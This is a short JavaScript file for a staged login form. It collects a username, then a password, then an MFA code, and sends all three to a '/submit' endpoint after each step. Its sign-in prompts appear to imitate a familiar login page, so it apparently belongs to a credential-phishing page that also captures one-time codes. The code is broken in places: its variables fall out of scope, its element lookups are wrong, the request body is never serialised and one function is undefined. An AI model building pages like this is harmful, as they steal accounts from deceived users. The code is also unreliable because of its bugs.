const nextButton = function( e ) {
  e.preventDefault();
  const text = document.querySelector("#inputField")

  if(currentStep === "username"){
    username = text.value;
  }
  else if (currentStep === "password") {
    password = text.value;
  }
  else if (currentStep === "mfa") {
    mfa = text.value;
  }

  const json = {
    username: username,
    password: password,
    mfa: mfa
  }

  // add to server
  fetch("/submit", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: json
  })
  updateScreen()
  return false;
}

const updateScreen = function() {
  // update screen to parse next arg
  if(currentStep === "username"){
    moveToPassword()
    currentStep = "password"
  }
  else if (currentStep === "password") {
    moveToMFA()
    currentStep = "mfa"
  }
}

const moveToPassword = function(json) {
  document.getElementById("#headerField").placeholder = "Complete sign in...";
  document.getElementById("#subheaderField").placeholder = "${username}";
  document.getElementById("#inputField").placeholder = "Enter your password";
  document.getElementById("#forgotField").placeholder = "Forgot password?";
}

window.onload = function() {
  var username = "";
  var password = "";
  var mfa = "";
  var currentStep = "username"
  const button = document.querySelector( '#loginButton' )
  button.onclick = nextButton
}
